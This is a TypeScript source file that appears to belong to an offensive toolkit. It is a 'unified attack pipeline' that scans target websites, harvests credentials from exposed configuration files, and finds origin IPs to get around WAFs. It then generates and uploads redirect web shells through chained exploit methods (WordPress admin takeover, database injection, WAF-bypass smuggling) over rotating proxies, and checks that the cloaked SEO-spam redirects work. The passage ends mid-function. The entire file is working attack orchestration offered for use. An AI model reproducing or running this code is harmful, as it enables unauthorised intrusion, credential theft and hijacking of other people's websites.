/**
 * Unified Attack Pipeline — Chains together:
 *   1. AI Vulnerability Analysis (deep scan)
 *   2. Shell Generation (tailored per target)
 *   3. Multi-Method Upload (aggressive fallback chain)
 *   4. Verification (HTTP check + redirect test)
 *
 * This is the "brain" that makes Autonomous Friday + SEO Spam work together.
 */
import { preScreenTarget, type PreScreenResult } from "./ai-prescreening";
import { fullVulnScan, type VulnScanResult, type RankedAttackVector, type ServerInfo, type CmsDetection } from "./ai-vuln-analyzer";
import { generateShellsForTarget, pickBestShell, type GeneratedShell, type ShellGenerationConfig } from "./ai-shell-generator";
import { oneClickDeploy, type DeployResult, type DeployOptions, type ProgressEvent as DeployProgressEvent } from "./one-click-deploy";
import { tryAllUploadMethods, type UploadAttemptResult } from "./alt-upload-methods";
import { multiVectorParallelUpload, smartRetryUpload, type EnhancedUploadResult, type ParallelUploadConfig } from "./enhanced-upload-engine";
// ─── NEW ENGINES ───
import { runWafBypass, type WafBypassResult, type WafBypassConfig } from "./waf-bypass-engine";
import { runAllAltUploadVectors, type AltUploadResult, type AltUploadConfig } from "./alt-upload-vectors";
import { runAllIndirectAttacks as runIndirectAttacks, type IndirectAttackResult, type IndirectAttackConfig } from "./indirect-attack-engine";
import { runAllDnsAttacks as runDnsAttacks, type DnsAttackResult, type DnsAttackConfig } from "./dns-domain-attacks";
import { runAllConfigExploits as runConfigExploits, type ConfigExploitResult, type ConfigExploitConfig } from "./config-exploitation";
import { generateCloakingPackage, type CloakingConfig, type CloakingShell as CloakingShellResult } from "./cloaking-shell-generator";
import { generateContentPack, type ContentConfig, type ContentPack } from "./cloaking-content-engine";
import { executeInjection, type InjectionConfig, type InjectionResult } from "./php-injector";
import { uploadContentToCdn, type CdnUploadResult } from "./content-cdn";
import { sendTelegramNotification, type TelegramNotification } from "./telegram-notifier";
import { runWpAdminTakeover, runShellExecFallback, type WpAdminConfig, type WpTakeoverResult } from "./wp-admin-takeover";
import { runWpDbInjection, type WpDbInjectionConfig, type WpDbInjectionResult } from "./wp-db-injection";
import { proxyPool } from "./proxy-pool";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface PipelineConfig {
  targetUrl: string;
  redirectUrl: string;
  seoKeywords: string[];
  cloaking?: boolean;
  geoRedirect?: boolean;
  parasiteContent?: "short" | "medium" | "long";
  maxUploadAttempts?: number;
  timeoutPerMethod?: number;
  // Cloaking options (fdv.uni-lj.si style)
  enableCloaking?: boolean;
  cloakingBrand?: string;
  cloakingContentType?: "landing" | "article" | "doorway" | "review";
  // Advanced attack options
  enableWafBypass?: boolean;
  enableAltUpload?: boolean;
  enableIndirectAttacks?: boolean;
  enableDnsAttacks?: boolean;
  enableConfigExploit?: boolean;
  enableWpAdminTakeover?: boolean;
  enableWpDbInjection?: boolean;
  proxyUrl?: string; // residential proxy support
  // Method priority & advanced config
  methodPriority?: Array<{ id: string; enabled: boolean }>;
  proxyList?: string[]; // multiple proxy URLs
  weightedRedirects?: Array<{ url: string; weight: number }>;
}

export interface PipelineEvent {
  phase: "prescreen" | "vuln_scan" | "shell_gen" | "upload" | "verify" | "complete" | "error" | "waf_bypass" | "alt_upload" | "indirect" | "dns_attack" | "config_exploit" | "recon" | "cloaking" | "wp_admin" | "wp_db_inject" | "world_update";
  step: string;
  detail: string;
  progress: number; // 0-100
  data?: any;
}

export interface UploadedFile {
  url: string;
  shell: GeneratedShell;
  method: string;
  verified: boolean;
  redirectWorks: boolean;
  httpStatus: number;
}

export interface PipelineResult {
  success: boolean;
  targetUrl: string;
  redirectUrl: string;
  prescreen: PreScreenResult | null;
  vulnScan: VulnScanResult | null;
  shellsGenerated: number;
  uploadAttempts: number;
  uploadedFiles: UploadedFile[];
  verifiedFiles: UploadedFile[];
  totalDuration: number;
  aiDecisions: string[];
  errors: string[];
  // Advanced attack results
  wafBypassResults?: WafBypassResult[];
  altUploadResults?: AltUploadResult[];
  indirectAttackResults?: IndirectAttackResult[];
  dnsAttackResults?: DnsAttackResult[];
  configExploitResults?: ConfigExploitResult[];
  originIp?: string;
  discoveredCredentials?: any[];
  // WP Admin Takeover & DB Injection results
  wpAdminResults?: WpTakeoverResult[];
  wpDbInjectionResults?: WpDbInjectionResult[];
  // Cloaking results
  cloakingShell?: CloakingShellResult | null;
  contentPack?: ContentPack | null;
  // Injection & CDN results
  injectionResult?: InjectionResult | null;
  cdnUploadResult?: CdnUploadResult | null;
  telegramSent?: boolean;
}

type EventCallback = (event: PipelineEvent) => void;

// ═══════════════════════════════════════════════════════
//  VERIFICATION
// ═══════════════════════════════════════════════════════

async function verifyUploadedFile(
  fileUrl: string,
  redirectUrl: string,
  onEvent: EventCallback,
): Promise<{ verified: boolean; redirectWorks: boolean; httpStatus: number }> {
  try {
    // Step 1: Check if file is accessible (not 403/404)
    const resp = await fetch(fileUrl, {
      method: "GET",
      redirect: "manual",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      signal: AbortSignal.timeout(10000),
    });

    const httpStatus = resp.status;

    if (httpStatus === 403 || httpStatus === 404 || httpStatus === 500) {
      onEvent({
        phase: "verify",
        step: "file_check",
        detail: `❌ ไฟล์ไม่สามารถเข้าถึงได้ (HTTP ${httpStatus}): ${fileUrl}`,
        progress: 0,
      });
      return { verified: false, redirectWorks: false, httpStatus };
    }

    // Step 2: Check if redirect works (simulate search engine referer)
    const redirectResp = await fetch(fileUrl + "?r=1", {
      method: "GET",
      redirect: "manual",
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://www.google.com/search?q=test",
      },
      signal: AbortSignal.timeout(10000),
    });

    const location = redirectResp.headers.get("location") || "";
    const redirectWorks = (redirectResp.status === 301 || redirectResp.status === 302) &&
      location.includes(new URL(redirectUrl).hostname);

    if (!redirectWorks && (httpStatus === 200 || httpStatus === 301 || httpStatus === 302)) {
      // Try checking if the page content contains redirect JS
      try {
        const bodyResp = await fetch(fileUrl + "?r=1", {
          method: "GET",
          headers: {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Referer": "https://www.google.com/search?q=test",
          },
          signal: AbortSignal.timeout(10000),
        });
        const body = await bodyResp.text();
        const hasJsRedirect = body.includes("window.location") || body.includes("location.replace") || body.includes("location.href");
        const hasMetaRedirect = body.includes("http-equiv=\"refresh\"") || body.includes("http-equiv='refresh'");
        const hasRedirectUrl = body.includes(redirectUrl) || body.includes(new URL(redirectUrl).hostname);

        if ((hasJsRedirect || hasMetaRedirect) && hasRedirectUrl) {
          onEvent({
            phase: "verify",
            step: "redirect_check",
            detail: `✅ Redirect ทำงาน (via ${hasJsRedirect ? "JS" : "meta refresh"}): ${fileUrl}`,
            progress: 100,
          });
          return { verified: true, redirectWorks: true, httpStatus };
        }
      } catch {
        // Ignore body check errors
      }
    }

    if (redirectWorks) {
      onEvent({
        phase: "verify",
        step: "redirect_check",
        detail: `✅ Redirect ทำงาน (301 → ${location}): ${fileUrl}`,
        progress: 100,
      });
    } else {
      onEvent({
        phase: "verify",
        step: "redirect_check",
        detail: `⚠️ ไฟล์เข้าถึงได้ (HTTP ${httpStatus}) แต่ redirect ยังไม่ทำงาน: ${fileUrl}`,
        progress: 50,
      });
    }

    return { verified: httpStatus >= 200 && httpStatus < 400, redirectWorks, httpStatus };
  } catch (error: any) {
    onEvent({
      phase: "verify",
      step: "error",
      detail: `❌ Verification error: ${error.message}`,
      progress: 0,
    });
    return { verified: false, redirectWorks: false, httpStatus: 0 };
  }
}

// ═══════════════════════════════════════════════════════
//  UPLOAD ORCHESTRATOR
// ═══════════════════════════════════════════════════════

// ─── Method priority mapping ───
const METHOD_REGISTRY: Record<string, string> = {
  oneclick: "oneClickDeploy",
  wp_admin: "wpAdminTakeover",
  wp_db: "wpDbInjection",
  alt_upload: "altUploadVectors",
  waf_bypass: "wafBypass",
  indirect: "indirectAttacks",
  dns: "dnsAttacks",
  config_exploit: "configExploitation",
  try_all: "tryAllUploadMethods",
  parallel: "multiVectorParallel",
  smart_retry: "smartRetryUpload",
};

function getEnabledMethods(config: PipelineConfig): string[] {
  if (!config.methodPriority || config.methodPriority.length === 0) {
    // Default order
    return ["oneclick", "try_all", "parallel", "smart_retry"];
  }
  return config.methodPriority
    .filter(m => m.enabled)
    .map(m => m.id);
}

// ─── Weighted redirect selection ───
function selectRedirectUrl(config: PipelineConfig): string {
  if (!config.weightedRedirects || config.weightedRedirects.length === 0) {
    return config.redirectUrl;
  }
  const totalWeight = config.weightedRedirects.reduce((sum, r) => sum + r.weight, 0);
  let random = Math.random() * totalWeight;
  for (const wr of config.weightedRedirects) {
    random -= wr.weight;
    if (random <= 0) return wr.url;
  }
  return config.weightedRedirects[0].url;
}

// ─── Proxy rotation (with residential proxy pool fallback) ───
function selectProxy(config: PipelineConfig): string | undefined {
  // 1. User-provided proxy list takes priority
  if (config.proxyList && config.proxyList.length > 0) {
    return config.proxyList[Math.floor(Math.random() * config.proxyList.length)];
  }
  // 2. User-provided single proxy
  if (config.proxyUrl) {
    return config.proxyUrl;
  }
  // 3. Auto-select from residential proxy pool
  const poolProxy = proxyPool.getProxy("weighted");
  return poolProxy?.url;
}

async function uploadShellWithAllMethods(
  targetUrl: string,
  shell: GeneratedShell,
  prescreen: PreScreenResult | null,
  vulnScan: VulnScanResult | null,
  config: PipelineConfig,
  onEvent: EventCallback,
): Promise<{ success: boolean; url: string; method: string }> {
  const fileContent = typeof shell.content === "string" ? shell.content : shell.content.toString("base64");
  const timeout = config.timeoutPerMethod || 30000;
  const enabledMethods = getEnabledMethods(config);
  const effectiveRedirectUrl = selectRedirectUrl(config);
  const proxyUrl = selectProxy(config);

  onEvent({
    phase: "upload",
    step: "method_plan",
    detail: `📋 Upload plan: ${enabledMethods.length} methods enabled — ${enabledMethods.map(m => METHOD_REGISTRY[m] || m).join(" → ")}${proxyUrl ? " (via proxy)" : ""}`,
    progress: 10,
  });

  // Method 1: oneClickDeploy (full pipeline)
  if (!enabledMethods.includes("oneclick") && enabledMethods.length > 0) {
    // Skip if not in priority list
  } else {
  onEvent({
    phase: "upload",
    step: "oneclick",
    detail: `📤 Method 1: oneClickDeploy — ${shell.filename}`,
    progress: 10,
  });

  try {
    const deployOpts: DeployOptions = {
      maxRetries: 3,
      uploadTimeout: timeout,
      verifyTimeout: 10000,
      seoKeywords: config.seoKeywords,
      enableParasitePages: true,
      parasiteContentLength: config.parasiteContent || "medium",
      preScreenResult: prescreen || undefined,
      onProgress: (event: DeployProgressEvent) => {
        onEvent({
          phase: "upload",
          step: "oneclick",
          detail: `oneClickDeploy: ${event.detail || event.phaseName || ""}`,
          progress: 10 + (event.progress || 0) * 0.2,
        });
      },
    };

    const result: DeployResult = await Promise.race([
      oneClickDeploy(targetUrl, config.redirectUrl, deployOpts),
      new Promise<DeployResult>((_, reject) => setTimeout(() => reject(new Error("oneClickDeploy timeout")), timeout + 15000)),
    ]);

    const shellUrl = result.shellInfo?.url || result.deployedFiles?.find(f => f.status === "deployed" && f.url)?.url;
    if (result.success && shellUrl) {
      onEvent({
        phase: "upload",
        step: "oneclick_success",
        detail: `✅ oneClickDeploy สำเร็จ: ${shellUrl}`,
        progress: 30,
      });
      return { success: true, url: shellUrl, method: "oneClickDeploy" };
    }
  } catch (error: any) {
    onEvent({
      phase: "upload",
      step: "oneclick_fail",
      detail: `⚠️ oneClickDeploy ล้มเหลว: ${error.message} — ลอง method ถัดไป`,
      progress: 25,
    });
  }
  } // end oneclick block

  // Method 2: tryAllUploadMethods (FTP, CMS exploits, WebDAV, API endpoints)
  if (prescreen && (enabledMethods.includes("try_all") || enabledMethods.length === 0)) {
    onEvent({
      phase: "upload",
      step: "all_methods",
      detail: `📤 Method 2: tryAllUploadMethods — ${shell.filename}`,
      progress: 30,
    });

    try {
      const results: UploadAttemptResult[] = await Promise.race([
        tryAllUploadMethods(
          targetUrl,
          prescreen,
          fileContent,
          shell.filename,
          "/",
          (method, status) => {
            onEvent({
              phase: "upload",
              step: "all_methods",
              detail: `tryAll: [${method}] ${status}`,
              progress: 35,
            });
          },
        ),
        new Promise<UploadAttemptResult[]>((_, reject) => setTimeout(() => reject(new Error("tryAllUploadMethods timeout")), timeout + 30000)),
      ]);

      const successResult = results.find(r => r.success && r.fileUrl);
      if (successResult && successResult.fileUrl) {
        onEvent({
          phase: "upload",
          step: "all_methods_success",
          detail: `✅ ${successResult.method} สำเร็จ: ${successResult.fileUrl}`,
          progress: 50,
        });
        return { success: true, url: successResult.fileUrl, method: successResult.method };
      }
    } catch (error: any) {
      onEvent({
        phase: "upload",
        step: "all_methods_fail",
        detail: `⚠️ tryAllUploadMethods ล้มเหลว: ${error.message}`,
        progress: 45,
      });
    }
  }

  // Method 3: multiVectorParallelUpload (brute force parallel)
  if (!enabledMethods.includes("parallel") && enabledMethods.length > 0) {
    // Skip
  } else {
  onEvent({
    phase: "upload",
    step: "parallel",
    detail: `📤 Method 3: multiVectorParallelUpload — ${shell.filename}`,
    progress: 50,
  });

  try {
    const uploadPaths = vulnScan?.writablePaths.map(w => w.path) || prescreen?.writablePaths || ["/wp-content/uploads/", "/uploads/", "/images/", "/tmp/"];
    const parallelConfig: ParallelUploadConfig = {
      targetUrl,
      fileContent,
      fileName: shell.filename,
      uploadPaths,
      prescreen,
      timeout,
      onMethodProgress: (method, status) => {
        onEvent({
          phase: "upload",
          step: "parallel",
          detail: `parallel: [${method}] ${status}`,
          progress: 55,
        });
      },
    };

    const result = await Promise.race([
      multiVectorParallelUpload(parallelConfig),
      new Promise<any>((_, reject) => setTimeout(() => reject(new Error("parallel upload timeout")), timeout + 30000)),
    ]);

    if (result.success && result.bestResult?.fileUrl) {
      onEvent({
        phase: "upload",
        step: "parallel_success",
        detail: `✅ Parallel upload สำเร็จ: ${result.bestResult.fileUrl}`,
        progress: 70,
      });
      return { success: true, url: result.bestResult.fileUrl, method: `parallel_${result.bestResult.method}` };
    }
  } catch (error: any) {
    onEvent({
      phase: "upload",
      step: "parallel_fail",
      detail: `⚠️ Parallel upload ล้มเหลว: ${error.message}`,
      progress: 65,
    });
  }
  } // end parallel block

  // Method 4: smartRetryUpload (adaptive retry with increasing timeouts)
  if (!enabledMethods.includes("smart_retry") && enabledMethods.length > 0) {
    // Skip
  } else {
  onEvent({
    phase: "upload",
    step: "smart_retry",
    detail: `📤 Method 4: smartRetryUpload — ${shell.filename}`,
    progress: 70,
  });

  try {
    const uploadPaths = vulnScan?.writablePaths.map(w => w.path) || prescreen?.writablePaths || ["/wp-content/uploads/", "/uploads/", "/images/"];
    const retryConfig: ParallelUploadConfig = {
      targetUrl,
      fileContent,
      fileName: shell.filename,
      uploadPaths,
      prescreen,
      timeout: timeout + 10000,
      onMethodProgress: (method, status) => {
        onEvent({
          phase: "upload",
          step: "smart_retry",
          detail: `smartRetry: [${method}] ${status}`,
          progress: 75,
        });
      },
    };

    const result = await Promise.race([
      smartRetryUpload(retryConfig, 3),
      new Promise<any>((_, reject) => setTimeout(() => reject(new Error("smart retry timeout")), (timeout + 10000) * 3 + 30000)),
    ]);

    if (result.success && result.bestResult?.fileUrl) {
      onEvent({
        phase: "upload",
        step: "smart_retry_success",
        detail: `✅ Smart retry สำเร็จ: ${result.bestResult.fileUrl}`,
        progress: 85,
      });
      return { success: true, url: result.bestResult.fileUrl, method: `smart_retry_${result.bestResult.method}` };
    }
  } catch (error: any) {
    onEvent({
      phase: "upload",
      step: "smart_retry_fail",
      detail: `⚠️ Smart retry ล้มเหลว: ${error.message}`,
      progress: 80,
    });
  }
  } // end smart_retry block

  return { success: false, url: "", method: "all_failed" };
}

// ═══════════════════════════════════════════════════════
//  MAIN PIPELINE
// ═══════════════════════════════════════════════════════

export async function runUnifiedAttackPipeline(
  config: PipelineConfig,
  onEvent: EventCallback = () => {},
): Promise<PipelineResult> {
  const startTime = Date.now();
  const aiDecisions: string[] = [];
  const errors: string[] = [];
  const uploadedFiles: UploadedFile[] = [];
  let prescreen: PreScreenResult | null = null;
  let vulnScan: VulnScanResult | null = null;

  onEvent({
    phase: "prescreen",
    step: "start",
    detail: `🔍 เริ่มวิเคราะห์เป้าหมาย: ${config.targetUrl}`,
    progress: 0,
  });

  // ─── Phase 1: Pre-screening ───
  try {
    onEvent({
      phase: "prescreen",
      step: "scanning",
      detail: "🔍 Phase 1: AI Pre-screening — วิเคราะห์ server, CMS, WAF, ports...",
      progress: 5,
    });

    prescreen = await Promise.race([
      preScreenTarget(config.targetUrl.replace(/^https?:\/\//, "").replace(/\/$/, "")),
      new Promise<PreScreenResult>((_, reject) => setTimeout(() => reject(new Error("prescreen timeout")), 60000)),
    ]);

    aiDecisions.push(`Pre-screen: ${prescreen.serverType || "Unknown"} server, CMS: ${prescreen.cms || "none"}, WAF: ${prescreen.wafDetected || "none"}, Success probability: ${prescreen.overallSuccessProbability}%`);

    onEvent({
      phase: "prescreen",
      step: "complete",
      detail: `✅ Pre-screen เสร็จ — Server: ${prescreen.serverType || "Unknown"}, CMS: ${prescreen.cms || "none"}, WAF: ${prescreen.wafDetected || "none"}, โอกาสสำเร็จ: ${prescreen.overallSuccessProbability}%`,
      progress: 15,
      data: { prescreen },
    });

    // Emit world state update after prescreen
    onEvent({
      phase: "world_update",
      step: "prescreen_done",
      detail: "World state updated from pre-screen",
      progress: 15,
      data: {
        hosts: 1,
        ports: 0,
        vulns: 0,
        creds: 0,
        uploadPaths: prescreen.writablePaths?.length || 0,
        shellUrls: 0,
        deployedFiles: 0,
        verifiedUrls: 0,
      },
    });
  } catch (error: any) {
    errors.push(`Pre-screen failed: ${error.message}`);
    onEvent({
      phase: "prescreen",
      step: "error",
      detail: `⚠️ Pre-screen ล้มเหลว: ${error.message} — ดำเนินการต่อด้วยข้อมูลจำกัด`,
      progress: 15,
    });
  }

  // ─── Phase 2: Deep Vulnerability Scan ───
  try {
    onEvent({
      phase: "vuln_scan",
      step: "scanning",
      detail: "🔬 Phase 2: AI Deep Scan — ค้นหาช่องโหว่, writable paths, upload endpoints...",
      progress: 20,
    });

    vulnScan = await Promise.race([
      fullVulnScan(config.targetUrl, (step: string, detail: string, progress: number) => {
        onEvent({
          phase: "vuln_scan",
          step,
          detail: `🔬 ${detail}`,
          progress: 20 + (progress / 100) * 15,
        });
      }),
      new Promise<VulnScanResult>((_, reject) => setTimeout(() => reject(new Error("vuln scan timeout")), 120000)),
    ]);

    if (vulnScan) {
      const topVectors = vulnScan.attackVectors.slice(0, 3);
      aiDecisions.push(`Deep scan: ${vulnScan.writablePaths.length} writable paths, ${vulnScan.uploadEndpoints.length} upload endpoints, ${vulnScan.attackVectors.length} attack vectors`);
      aiDecisions.push(`Top vectors: ${topVectors.map(v => `${v.name} (${v.successProbability}%)`).join(", ")}`);

      onEvent({
        phase: "vuln_scan",
        step: "complete",
        detail: `✅ Deep scan เสร็จ — ${vulnScan.writablePaths.length} writable paths, ${vulnScan.attackVectors.length} attack vectors`,
        progress: 35,
        data: { vulnScan },
      });

      // Emit world state update after vuln scan
      onEvent({
        phase: "world_update",
        step: "vulnscan_done",
        detail: "World state updated from vulnerability scan",
        progress: 35,
        data: {
          hosts: 1,
          ports: 0,
          vulns: vulnScan.misconfigurations?.length || 0,
          creds: 0,
          uploadPaths: vulnScan.writablePaths?.length || 0,
          shellUrls: 0,
          deployedFiles: 0,
          verifiedUrls: 0,
        },
      });
    }
  } catch (error: any) {
    errors.push(`Vuln scan failed: ${error.message}`);
    onEvent({
      phase: "vuln_scan",
      step: "error",
      detail: `⚠️ Deep scan ล้มเหลว: ${error.message} — ใช้ข้อมูลจาก pre-screen`,
      progress: 35,
    });
  }

  // ─── Phase 2.5: Recon — Config Exploitation + DNS/Origin IP Discovery ───
  let configResults: ConfigExploitResult[] = [];
  let dnsResults: DnsAttackResult[] = [];
  let originIp: string | undefined;
  let discoveredCredentials: any[] = [];

  if (config.enableConfigExploit !== false) {
    try {
      onEvent({
        phase: "config_exploit",
        step: "scanning",
        detail: "🔓 Phase 2.5a: Config Exploitation — ค้นหา backup files, .env, phpinfo, credentials...",
        progress: 36,
      });

      configResults = await Promise.race([
        runConfigExploits({
          targetUrl: config.targetUrl,
          timeout: config.timeoutPerMethod || 30000,
          onProgress: (vector: string, detail: string) => {
            onEvent({
              phase: "config_exploit",
              step: vector,
              detail: `🔓 ${detail}`,
              progress: 37,
            });
          },
        }),
        new Promise<ConfigExploitResult[]>((_, reject) => setTimeout(() => reject(new Error("config exploit timeout")), 60000)),
      ]);

      const successExploits = configResults.filter(r => r.success);
      discoveredCredentials = configResults.filter(r => r.credentials).flatMap(r => r.credentials ? [r.credentials] : []);

      if (successExploits.length > 0) {
        aiDecisions.push(`Config exploit: ${successExploits.length} findings — ${successExploits.map(r => r.vector).join(", ")}`);
      }
      if (discoveredCredentials.length > 0) {
        aiDecisions.push(`🔑 Discovered ${discoveredCredentials.length} credentials — will use for authenticated uploads`);
      }

      onEvent({
        phase: "config_exploit",
        step: "complete",
        detail: `✅ Config exploit เสร็จ — ${successExploits.length} findings, ${discoveredCredentials.length} credentials`,
        progress: 38,
        data: { configResults, discoveredCredentials },
      });
    } catch (error: any) {
      errors.push(`Config exploit failed: ${error.message}`);
    }
  }

  if (config.enableDnsAttacks !== false) {
    try {
      onEvent({
        phase: "dns_attack",
        step: "scanning",
        detail: "🌐 Phase 2.5b: DNS Recon — Origin IP discovery, subdomain takeover, DNS rebinding...",
        progress: 38,
      });

      const targetDomain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
      dnsResults = await Promise.race([
        runDnsAttacks({
          targetDomain,
          timeout: config.timeoutPerMethod || 30000,
          onProgress: (vector: string, detail: string) => {
            onEvent({
              phase: "dns_attack",
              step: vector,
              detail: `🌐 ${detail}`,
              progress: 39,
            });
          },
        }),
        new Promise<DnsAttackResult[]>((_, reject) => setTimeout(() => reject(new Error("dns attacks timeout")), 60000)),
      ]);

      const successDns = dnsResults.filter(r => r.success);
      const originResult = dnsResults.find(r => r.vector === "origin_ip_discovery" && r.success && r.data?.originIp);
      if (originResult) {
        originIp = originResult.data!.originIp;
        aiDecisions.push(`🎯 Origin IP discovered: ${originIp} — will bypass WAF by targeting directly`);
      }
      const takeoverResult = dnsResults.find(r => r.vector === "subdomain_takeover" && r.success);
      if (takeoverResult) {
        aiDecisions.push(`🎯 Subdomain takeover possible: ${takeoverResult.data?.vulnerableSubdomains?.map(s => s.subdomain).join(", ") || "unknown"}`);
      }

      onEvent({
        phase: "dns_attack",
        step: "complete",
        detail: `✅ DNS recon เสร็จ — ${successDns.length} findings${originIp ? `, Origin IP: ${originIp}` : ""}`,
        progress: 40,
        data: { dnsResults, originIp },
      });
    } catch (error: any) {
      errors.push(`DNS attacks failed: ${error.message}`);
    }
  }

  // ─── Cloaking variables (will be populated AFTER upload succeeds) ───
  let cloakingResult: CloakingShellResult | null = null;
  let contentPack: ContentPack | null = null;

  // ─── Phase 3: Shell Generation ───
  let shells: GeneratedShell[] = [];
  try {
    onEvent({
      phase: "shell_gen",
      step: "generating",
      detail: "🔧 Phase 3: AI Shell Generation — สร้าง redirect shells ตาม target profile...",
      progress: 40,
    });

    const shellConfig: ShellGenerationConfig = {
      redirectUrl: config.redirectUrl,
      seoKeywords: config.seoKeywords,
      targetVectors: vulnScan?.attackVectors || [],
      serverInfo: vulnScan?.serverInfo || {
        ip: prescreen?.ipAddress || "0.0.0.0",
        server: prescreen?.serverType || "Unknown",
        poweredBy: prescreen?.phpVersion || "",
        os: prescreen?.osGuess || "unknown",
        phpVersion: prescreen?.phpVersion || "",
        waf: prescreen?.wafDetected || null,
        cdn: null,
        ssl: prescreen?.sslInfo?.enabled || false,
        httpMethods: [],
        headers: {},
      } as ServerInfo,
      cms: vulnScan?.cms || {
        type: (prescreen?.cms as CmsDetection["type"]) || "unknown",
        version: prescreen?.cmsVersion || "",
        plugins: prescreen?.cmsPlugins || [],
        themes: prescreen?.cmsTheme ? [prescreen.cmsTheme] : [],
        vulnerableComponents: [],
        adminUrl: "",
        loginUrl: "",
        apiEndpoints: [],
      } as CmsDetection,
      cloaking: config.cloaking !== false,
      geoRedirect: config.geoRedirect,
      parasiteContent: config.parasiteContent || "medium",
    };

    shells = await generateShellsForTarget(
      vulnScan || {
        target: config.targetUrl,
        serverInfo: shellConfig.serverInfo,
        cms: shellConfig.cms,
        writablePaths: [],
        uploadEndpoints: [],
        exposedPanels: [],
        misconfigurations: [],
        attackVectors: [],
        aiAnalysis: "",
        scanDuration: 0,
        timestamp: Date.now(),
      } as VulnScanResult,
      shellConfig,
      (detail) => {
        onEvent({
          phase: "shell_gen",
          step: "generating",
          detail,
          progress: 45,
        });
      },
    );

    aiDecisions.push(`Generated ${shells.length} shells: ${shells.map(s => s.type).join(", ")}`);

    onEvent({
      phase: "shell_gen",
      step: "complete",
      detail: `✅ สร้าง ${shells.length} shell payloads เสร็จ`,
      progress: 50,
      data: { shellCount: shells.length, types: shells.map(s => s.type) },
    });
  } catch (error: any) {
    errors.push(`Shell generation failed: ${error.message}`);
    onEvent({
      phase: "shell_gen",
      step: "error",
      detail: `⚠️ Shell generation ล้มเหลว: ${error.message}`,
      progress: 50,
    });
  }

  // ─── Phase 4: Upload (try each shell with all methods) ───
  let totalAttempts = 0;

  if (shells.length > 0) {
    onEvent({
      phase: "upload",
      step: "start",
      detail: `📤 Phase 4: Upload — ลอง upload ${shells.length} shells ด้วยทุกวิธี...`,
      progress: 50,
    });

    // Sort shells by priority: AI-generated first, then PHP, then others
    // (Cloaking shells are generated AFTER upload succeeds — not before)
    const sortedShells = [...shells].sort((a, b) => {
      if (a.id.startsWith("ai_") && !b.id.startsWith("ai_")) return -1;
      if (!a.id.startsWith("ai_") && b.id.startsWith("ai_")) return 1;
      if (a.type === "redirect_php" && b.type !== "redirect_php") return -1;
      if (a.type === "seo_parasite" && b.type !== "seo_parasite") return -1;
      return 0;
    });

    // Try uploading each shell until we get at least one success
    for (let i = 0; i < sortedShells.length; i++) {
      const shell = sortedShells[i];
      totalAttempts++;

      onEvent({
        phase: "upload",
        step: `shell_${i + 1}`,
        detail: `📤 Upload shell ${i + 1}/${sortedShells.length}: ${shell.type} (${shell.filename})`,
        progress: 50 + (i / sortedShells.length) * 30,
      });

      const uploadResult = await uploadShellWithAllMethods(
        config.targetUrl,
        shell,
        prescreen,
        vulnScan,
        config,
        onEvent,
      );

      if (uploadResult.success && uploadResult.url) {
        // Verify the uploaded file
        onEvent({
          phase: "verify",
          step: "checking",
          detail: `🔍 Verifying: ${uploadResult.url}`,
          progress: 85,
        });

        const verification = await verifyUploadedFile(uploadResult.url, config.redirectUrl, onEvent);

        uploadedFiles.push({
          url: uploadResult.url,
          shell,
          method: uploadResult.method,
          verified: verification.verified,
          redirectWorks: verification.redirectWorks,
          httpStatus: verification.httpStatus,
        });

        aiDecisions.push(`✅ Upload success: ${shell.type} via ${uploadResult.method} → ${uploadResult.url} (verified: ${verification.verified}, redirect: ${verification.redirectWorks})`);

        // If we have a verified redirect, we can stop
        if (verification.redirectWorks) {
          onEvent({
            phase: "complete",
            step: "success",
            detail: `🎉 สำเร็จ! Redirect ทำงานจริง: ${uploadResult.url} → ${config.redirectUrl}`,
            progress: 100,
          });
          break;
        }

        // If file is accessible but redirect doesn't work yet, try more shells
        if (verification.verified && !verification.redirectWorks) {
          onEvent({
            phase: "upload",
            step: "partial",
            detail: `⚠️ ไฟล์เข้าถึงได้แต่ redirect ยังไม่ทำงาน — ลอง shell ถัดไป`,
            progress: 85,
          });
        }
      }

      // Stop after 5 failed attempts to avoid wasting time
      if (totalAttempts >= (config.maxUploadAttempts || 8) && uploadedFiles.length === 0) {
        onEvent({
          phase: "upload",
          step: "max_attempts",
          detail: `⚠️ ลอง ${totalAttempts} ครั้งแล้ว ยังไม่สำเร็จ — หยุดเพื่อประหยัดเวลา`,
          progress: 80,
        });
        break;
      }
    }
  }

  // ─── Phase 4.5: Advanced Attack Fallback (if standard upload failed) ───
  let wafBypassResults: WafBypassResult[] = [];
  let altUploadResults: AltUploadResult[] = [];
  let indirectResults: IndirectAttackResult[] = [];

  const hasVerifiedRedirect = uploadedFiles.some(f => f.redirectWorks);

  if (!hasVerifiedRedirect && shells.length > 0) {
    const bestShell = shells[0];
    const shellContent = typeof bestShell.content === "string" ? bestShell.content : bestShell.content.toString("base64");
    const targetForAdvanced = originIp ? `http://${originIp}` : config.targetUrl;

    // 4.5a: WAF Bypass uploads
    if (config.enableWafBypass !== false) {
      try {
        onEvent({
          phase: "waf_bypass",
          step: "start",
          detail: `🛡️ Phase 4.5a: WAF Bypass — Chunked, HTTP/2 Smuggling, Content-Type Confusion, Null Byte...`,
          progress: 82,
        });

        const uploadPaths = vulnScan?.writablePaths.map(w => w.path) || prescreen?.writablePaths || ["/wp-content/uploads/", "/uploads/", "/images/"];

        // Run WAF bypass for each upload path
        const wafPromises = uploadPaths.map(path =>
          runWafBypass({
            targetUrl: targetForAdvanced,
            uploadPath: path,
            fileContent: shellContent,
            originalFilename: bestShell.filename,
            timeout: config.timeoutPerMethod || 30000,
            onProgress: (method: string, detail: string) => {
              onEvent({
                phase: "waf_bypass",
                step: method,
                detail: `🛡️ ${detail}`,
                progress: 84,
              });
            },
          })
        );
        wafBypassResults = await Promise.race([
          Promise.all(wafPromises).then(results => results.flat()),
          new Promise<WafBypassResult[]>((_, reject) => setTimeout(() => reject(new Error("WAF bypass timeout")), 90000)),
        ]);

        const wafSuccess = wafBypassResults.find(r => r.success && r.fileUrl);
        if (wafSuccess && wafSuccess.fileUrl) {
